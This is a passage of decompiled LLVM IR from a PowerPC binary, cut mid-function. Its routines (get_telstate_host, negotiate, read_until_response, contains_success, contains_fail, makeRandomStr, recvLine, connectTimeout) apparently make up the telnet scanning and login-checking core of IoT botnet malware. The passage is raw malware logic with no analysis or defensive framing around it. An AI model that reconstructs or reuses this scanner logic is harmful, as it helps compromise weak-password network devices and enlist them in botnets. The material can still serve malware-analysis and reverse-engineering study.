  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp9)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp9, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.8 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.8, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000193c ], [ %storemerge3, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c2 = load i8, i8* %arg1, align 1
  %v3_10001b245 = icmp eq i8 %v2_10001b1c2, 0
  br i1 %v3_10001b245, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge7, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in6)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge7, align 1
  %v1_10001b10 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001b5c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001bdc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001bdc4, label %dec_label_pc_10001b78, label %dec_label_pc_10001be4

dec_label_pc_10001b78:                            ; preds = %entry, %dec_label_pc_10001b78
  %storemerge37 = phi i32 [ %v1_10001bcc, %dec_label_pc_10001b78 ], [ 0, %entry ]
  %v2_10001b84 = add i32 %storemerge37, %v0_10001b5c
  %v0_10001b88 = call i32 @rand_cmwc()
  store i32 %v0_10001b88, i32* %r3.global-to-local, align 4
  %v1_10001b9c = urem i32 %v0_10001b88, 26
  %fold = add nuw nsw i32 %v1_10001b9c, 65
  %v1_10001bc4 = trunc i32 %fold to i8
  %v3_10001bc4 = inttoptr i32 %v2_10001b84 to i8*
  store i8 %v1_10001bc4, i8* %v3_10001bc4, align 1
  %v1_10001bcc = add nuw nsw i32 %storemerge37, 1
  %v2_10001bdc = icmp slt i32 %v1_10001bcc, %arg2
  br i1 %v2_10001bdc, label %dec_label_pc_10001b78, label %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge

dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge: ; preds = %dec_label_pc_10001b78
  %v0_10001bfc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001be4

dec_label_pc_10001be4:                            ; preds = %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge, %entry
  %v0_10001bfc = phi i32 [ %v0_10001bfc.pre, %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge ], [ %v0_10001b5c, %entry ]
  ret i32 %v0_10001bfc

; uselistorder directives
  uselistorder i32 %v1_10001bcc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001b5c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001b78, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001c38.26 to i32), i32* @lr, align 4
  %v4_10001c34 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001c48 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001c5c

dec_label_pc_10001c5c:                            ; preds = %entry, %dec_label_pc_10001c5c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001c78, %dec_label_pc_10001c5c ]
  %v1_10001c64 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001c68 = add i32 %v1_10001c64, %v2_10001c48
  %v2_10001c70 = inttoptr i32 %v2_10001c68 to i32*
  store i32 0, i32* %v2_10001c70, align 4
  %v1_10001c78 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001c78, 32
  br i1 %tmp42, label %dec_label_pc_10001c5c, label %dec_label_pc_10001c8c

dec_label_pc_10001c8c:                            ; preds = %dec_label_pc_10001c5c
  %v1_10001c90 = udiv i32 %arg1, 32
  %v1_10001c98 = mul nuw nsw i32 %v1_10001c90, 4
  %v2_10001c9c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001ca0 = add nuw nsw i32 %v1_10001c98, 32
  %v1_10001ca4 = add i32 %v2_10001ca0, %v2_10001c9c
  %v1_10001ca8 = inttoptr i32 %v1_10001ca4 to i32*
  %v2_10001ca8 = load i32, i32* %v1_10001ca8, align 4
  %v1_10001cb0 = urem i32 %arg1, 32
  %v3_10001cb8 = shl i32 1, %v1_10001cb0
  %v2_10001cbc = or i32 %v2_10001ca8, %v3_10001cb8
  store i32 %v2_10001cbc, i32* %v1_10001ca8, align 4
  %v1_10001cd8 = add i32 %arg1, 1
  %v2_10001ce4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268442880, i32* @lr, align 4
  %v5_10001cfc = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001d0c = icmp sgt i32 %v5_10001cfc, 0
  br i1 %v2_10001d0c, label %dec_label_pc_10001e9c.preheader, label %dec_label_pc_10001e00.preheader

dec_label_pc_10001e00.preheader:                  ; preds = %dec_label_pc_10001c8c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10001d18, label %dec_label_pc_10001e9c.preheader

dec_label_pc_10001d18:                            ; preds = %dec_label_pc_10001e00.preheader, %dec_label_pc_10001df4
  %stack_var_-176.017 = phi i32 [ %v1_10001df8, %dec_label_pc_10001df4 ], [ %tmp25, %dec_label_pc_10001e00.preheader ]
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001c48, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge

dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge: ; preds = %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge.dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge_crit_edge, %dec_label_pc_10001d18
  %v3_10001d40.pre = phi i32 [ %v2_10001c48, %dec_label_pc_10001d18 ], [ %v3_10001d40.pre.pre, %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge.dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge_crit_edge ]
  %v1_10001d5849 = phi i32 [ 1, %dec_label_pc_10001d18 ], [ %v1_10001d58, %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge.dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge_crit_edge ]
  %v1_10001d44 = mul nuw nsw i32 %v1_10001d5849, 4
  %v2_10001d48 = add i32 %v1_10001d44, %v3_10001d40.pre
  %v2_10001d50 = inttoptr i32 %v2_10001d48 to i32*
  store i32 0, i32* %v2_10001d50, align 4
  %v1_10001d58 = add nuw nsw i32 %v1_10001d5849, 1
  %tmp44 = icmp ult i32 %v1_10001d58, 32
  br i1 %tmp44, label %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge.dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge_crit_edge, label %dec_label_pc_10001d6c

dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge.dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge
  %v3_10001d40.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge

dec_label_pc_10001d6c:                            ; preds = %dec_label_pc_10001d3c.dec_label_pc_10001d3c_crit_edge
  %v2_10001d88 = load i32, i32* %v1_10001ca8, align 4
  %v2_10001d9c = or i32 %v2_10001d88, %v3_10001cb8
  store i32 %v2_10001d9c, i32* %v1_10001ca8, align 4
  store i32 268443104, i32* @lr, align 4
  %v5_10001ddc = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001dec = icmp sgt i32 %v5_10001ddc, 0
  br i1 %v2_10001dec, label %dec_label_pc_10001e9c.preheader, label %dec_label_pc_10001df4

dec_label_pc_10001df4:                            ; preds = %dec_label_pc_10001d6c
  %v1_10001df8 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10001df8, 10
  br i1 %tmp45, label %dec_label_pc_10001d18, label %dec_label_pc_10001e9c.preheader

dec_label_pc_10001e9c.preheader:                  ; preds = %dec_label_pc_10001df4, %dec_label_pc_10001d6c, %dec_label_pc_10001e00.preheader, %dec_label_pc_10001c8c
  %v2_10001e28 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_10001e9c

dec_label_pc_10001e20:                            ; preds = %dec_label_pc_10001e9c
  %v3_10001e24 = load i32, i32* @global_var_10023510.27, align 4
  store i32 268443200, i32* @lr, align 4
  %v4_10001e3c = call i32 @__libc_recv(i32 %v3_10001e24, i32 %v2_10001e28, i32 1, i32 0)
  %v3_10001e44 = icmp eq i32 %v4_10001e3c, 1
  br i1 %v3_10001e44, label %dec_label_pc_10001e64, label %dec_label_pc_10001e4c

dec_label_pc_10001e4c:                            ; preds = %dec_label_pc_10001e20
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10001ed8

dec_label_pc_10001e64:                            ; preds = %dec_label_pc_10001e20
  %v3_10001e64 = load i8, i8* %stack_var_-32, align 1
  %v4_10001e6c = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10001e64, i8* %stack_var_-180.0, align 1
  %v1_10001e78 = add i32 %v4_10001e6c, 1
  %v5_10001e7c = inttoptr i32 %v1_10001e78 to i8*
  %v3_10001e80 = load i8, i8* %stack_var_-32, align 1
  %v3_10001e88 = icmp eq i8 %v3_10001e80, 10
  br i1 %v3_10001e88, label %dec_label_pc_10001ec4, label %dec_label_pc_10001e90

dec_label_pc_10001e90:                            ; preds = %dec_label_pc_10001e64
  %v1_10001e94 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_10001e9c

dec_label_pc_10001e9c:                            ; preds = %dec_label_pc_10001e9c.preheader, %dec_label_pc_10001e90
  %stack_var_-180.0 = phi i8* [ %v5_10001e7c, %dec_label_pc_10001e90 ], [ %arg2, %dec_label_pc_10001e9c.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10001e94, %dec_label_pc_10001e90 ], [ 0, %dec_label_pc_10001e9c.preheader ]
  %v0_10001ea4 = call i32 @__asm_mfcr()
  %v1_10001ea8 = call i32 @__asm_rlwinm(i32 %v0_10001ea4, i32 30, i32 31, i32 31)
  %v1_10001eac = urem i32 %v1_10001ea8, 256
  %v3_10001ebc = icmp eq i32 %v1_10001eac, 0
  br i1 %v3_10001ebc, label %dec_label_pc_10001ec4, label %dec_label_pc_10001e20

dec_label_pc_10001ec4:                            ; preds = %dec_label_pc_10001e9c, %dec_label_pc_10001e64
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_10001e9c ], [ %v5_10001e7c, %dec_label_pc_10001e64 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10001ed8

dec_label_pc_10001ed8:                            ; preds = %dec_label_pc_10001e4c, %dec_label_pc_10001ec4
  %storemerge = phi i32 [ -1, %dec_label_pc_10001e4c ], [ %stack_var_-184.0, %dec_label_pc_10001ec4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10001e7c, { 1, 0 }
  uselistorder i32 %v1_10001df8, { 1, 0 }
  uselistorder i32 %v1_10001d58, { 1, 0 }
  uselistorder i32 %v2_10001ce4, { 1, 0 }
  uselistorder i32* %v1_10001ca8, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001c48, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10001e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d18, { 1, 0 }
  uselistorder label %dec_label_pc_10001c5c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10001f14 = add i32 %arg1, 4
  %v2_10001f14 = inttoptr i32 %v1_10001f14 to i32*
  %v3_10001f14 = load i32, i32* %v2_10001f14, align 4
  store i32 %v3_10001f14, i32* %stack_var_-20, align 4
  store i32 268443440, i32* @lr, align 4
  %v3_10001f2c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10001f2c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268443536, i32* @lr, align 4
  %v4_10001f8c = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10001fa4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10001fb4 = load i8, i8* %arg3, align 1
  %v3_10001fbc = icmp eq i8 %v3_10001fb4, -1
  br i1 %v3_10001fbc, label %dec_label_pc_10001fc4, label %dec_label_pc_10001fd8

dec_label_pc_10001fc4:                            ; preds = %entry
  store i32 268443608, i32* @lr, align 4
  %v6_10001fd4 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10001fd8

dec_label_pc_10001fd8:                            ; preds = %entry, %dec_label_pc_10001fc4
  %v3_10001fe4 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10001fec = icmp ne i32 %v3_10001fe4, 0
  %. = zext i1 %v3_10001fec to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10001fd8, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_1000205c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000205c, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge

dec_label_pc_10002070.dec_label_pc_10002070_crit_edge: ; preds = %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge.dec_label_pc_10002070.dec_label_pc_10002070_crit_edge_crit_edge, %entry
  %v3_10002074.pre = phi i32 [ %v2_1000205c, %entry ], [ %v3_10002074.pre.pre, %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge.dec_label_pc_10002070.dec_label_pc_10002070_crit_edge_crit_edge ]
  %v1_1000208c21 = phi i32 [ 1, %entry ], [ %v1_1000208c, %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge.dec_label_pc_10002070.dec_label_pc_10002070_crit_edge_crit_edge ]
  %v1_10002078 = mul nuw nsw i32 %v1_1000208c21, 4
  %v2_1000207c = add i32 %v1_10002078, %v3_10002074.pre
  %v2_10002084 = inttoptr i32 %v2_1000207c to i32*
  store i32 0, i32* %v2_10002084, align 4
  %v1_1000208c = add nuw nsw i32 %v1_1000208c21, 1
  %tmp19 = icmp ult i32 %v1_1000208c, 32
  br i1 %tmp19, label %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge.dec_label_pc_10002070.dec_label_pc_10002070_crit_edge_crit_edge, label %dec_label_pc_100020a0

dec_label_pc_10002070.dec_label_pc_10002070_crit_edge.dec_label_pc_10002070.dec_label_pc_10002070_crit_edge_crit_edge: ; preds = %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge
  %v3_10002074.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge

dec_label_pc_100020a0:                            ; preds = %dec_label_pc_10002070.dec_label_pc_10002070_crit_edge
  %v1_100020a4 = udiv i32 %arg1, 32
  %v1_100020ac = mul nuw nsw i32 %v1_100020a4, 4
  %v2_100020b0 = ptrtoint i32* %stack_var_-184 to i32
  %v2_100020b4 = add nuw nsw i32 %v1_100020ac, 8
  %v1_100020b8 = add i32 %v2_100020b4, %v2_100020b0
  %v1_100020bc = inttoptr i32 %v1_100020b8 to i32*
  %v2_100020bc = load i32, i32* %v1_100020bc, align 4
  %v1_100020c4 = urem i32 %arg1, 32
  %v3_100020cc = shl i32 1, %v1_100020c4
  %v2_100020d0 = or i32 %v2_100020bc, %v3_100020cc
  store i32 %v2_100020d0, i32* %v1_100020bc, align 4
  %v1_100020ec = add i32 %arg1, 1
  %v2_100020f4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268443920, i32* @lr, align 4
  %v5_1000210c = call i32 @__libc_select(i32 %v1_100020ec, i32 %v2_1000205c, i32 0, i32 0, i32 %v2_100020f4)
  %v2_10002114 = icmp sgt i32 %v5_1000210c, 0
  br i1 %v2_10002114, label %dec_label_pc_10002128, label %dec_label_pc_10002148

dec_label_pc_10002128:                            ; preds = %dec_label_pc_100020a0
  store i32 268443968, i32* @lr, align 4
  %v4_1000213c = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002148

dec_label_pc_10002148:                            ; preds = %dec_label_pc_100020a0, %dec_label_pc_10002128
  %storemerge = phi i32 [ %v4_1000213c, %dec_label_pc_10002128 ], [ 0, %dec_label_pc_100020a0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1000208c, { 1, 0 }
  uselistorder i32 %v2_1000205c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002148, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10002188 = icmp eq i32 %arg2, 0
  br i1 %v3_10002188, label %dec_label_pc_10002190, label %dec_label_pc_100021a0

dec_label_pc_10002190:                            ; preds = %entry
  %v2_10002194 = load i32, i32* %arg1, align 4
  store i32 268444064, i32* @lr, align 4
  %v1_1000219c = call i32 @__libc_close(i32 %v2_10002194)
  br label %dec_label_pc_100021a0

dec_label_pc_100021a0:                            ; preds = %entry, %dec_label_pc_10002190
  %v2_100021a8 = add i32 %tmp, 16
  %v3_100021a8 = inttoptr i32 %v2_100021a8 to i32*
  store i32 0, i32* %v3_100021a8, align 4
  %v1_100021b8 = trunc i32 %arg2 to i8
  %v3_100021b8 = add i32 %tmp, 8
  %v4_100021b8 = inttoptr i32 %v3_100021b8 to i8*
  store i8 %v1_100021b8, i8* %v4_100021b8, align 1
  %v1_100021c0 = add i32 %tmp, 24
  %v2_100021c0 = inttoptr i32 %v1_100021c0 to i32*
  %v3_100021c0 = load i32, i32* %v2_100021c0, align 4
  store i32 268444120, i32* @lr, align 4
  %v3_100021d4 = call i32 @__GI_memset(i32 %v3_100021c0, i32 0, i32 1024)
  ret i32 %v3_100021d4

; uselistorder directives
  uselistorder label %dec_label_pc_100021a0, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10002210 = inttoptr i32 %arg1 to i32*
  %v3_10002210 = call i32 @advance_state(i32* %v2_10002210, i32 0)
  %v3_1000221c = add i32 %arg1, 9
  %v4_1000221c = inttoptr i32 %v3_1000221c to i8*
  store i8 1, i8* %v4_1000221c, align 1
  ret i32 %v3_10002210

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10002260 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_1002315c.31 to i32))
  ret i32 %v3_10002260
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100022ac = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002313c.39 to i32))
  ret i32 %v3_100022ac

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268444400, i32* @lr, align 4
  %v1_100022ec = call i32 @contains_success(i32 %arg1)
  %v3_100022f4 = icmp eq i32 %v1_100022ec, 0
  br i1 %v3_100022f4, label %dec_label_pc_100022fc, label %dec_label_pc_10002324

dec_label_pc_100022fc:                            ; preds = %entry
  store i32 268444420, i32* @lr, align 4
  %v1_10002300 = call i32 @contains_fail(i32 %arg1)
  %v3_10002308 = icmp ne i32 %v1_10002300, 0
  %. = zext i1 %v3_10002308 to i32
  br label %dec_label_pc_10002324

dec_label_pc_10002324:                            ; preds = %dec_label_pc_100022fc, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_100022fc ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002378

dec_label_pc_10002378:                            ; preds = %dec_label_pc_10002378, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_1000237c, %dec_label_pc_10002378 ]
  %v1_1000237c = add i32 %stack_var_-36.0, 1
  %v1_10002388 = mul i32 %v1_1000237c, 4
  %v2_10002394 = add i32 %v1_10002388, %arg2
  %v1_10002398 = inttoptr i32 %v2_10002394 to i32*
  %v2_10002398 = load i32, i32* %v1_10002398, align 4
  %v3_1000239c = icmp eq i32 %v2_10002398, 0
  br i1 %v3_1000239c, label %dec_label_pc_100023fc.preheader, label %dec_label_pc_10002378

dec_label_pc_100023fc.preheader:                  ; preds = %dec_label_pc_10002378
  %v2_100024044 = icmp sgt i32 %v1_1000237c, 0
  br i1 %v2_100024044, label %dec_label_pc_100023b0.lr.ph, label %dec_label_pc_10002414

dec_label_pc_100023b0.lr.ph:                      ; preds = %dec_label_pc_100023fc.preheader
  %v3_100023d4 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100023b0

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_100023b0.lr.ph, %dec_label_pc_100023f0
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100023b0.lr.ph ], [ %v1_100023f4, %dec_label_pc_100023f0 ]
  %v1_100023b4 = mul i32 %storemerge27, 4
  %v2_100023c0 = add i32 %v1_100023b4, %arg2
  %v1_100023c4 = inttoptr i32 %v2_100023c0 to i32*
  %v2_100023c4 = load i32, i32* %v1_100023c4, align 4
  store i32 268444632, i32* @lr, align 4
  %v4_100023d4 = call i32 @strcasestr(i8* %v3_100023d4, i32 %v2_100023c4, i32 %v2_100023c0)
  %v3_100023dc = icmp eq i32 %v4_100023d4, 0
  br i1 %v3_100023dc, label %dec_label_pc_100023f0, label %dec_label_pc_10002414.loopexit

dec_label_pc_100023f0:                            ; preds = %dec_label_pc_100023b0
  %v1_100023f4 = add nuw nsw i32 %storemerge27, 1
  %v2_10002404 = icmp slt i32 %v1_100023f4, %v1_1000237c
  br i1 %v2_10002404, label %dec_label_pc_100023b0, label %dec_label_pc_10002414.loopexit

dec_label_pc_10002414.loopexit:                   ; preds = %dec_label_pc_100023f0, %dec_label_pc_100023b0
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100023b0 ], [ 0, %dec_label_pc_100023f0 ]
  br label %dec_label_pc_10002414

dec_label_pc_10002414:                            ; preds = %dec_label_pc_10002414.loopexit, %dec_label_pc_100023fc.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_100023fc.preheader ], [ %storemerge.ph, %dec_label_pc_10002414.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_1000237c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100023b0, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444780, i32* @lr, align 4
  %v2_10002468 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_10002494.40 to i32), i32* @lr, align 4
  %v2_10002490 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
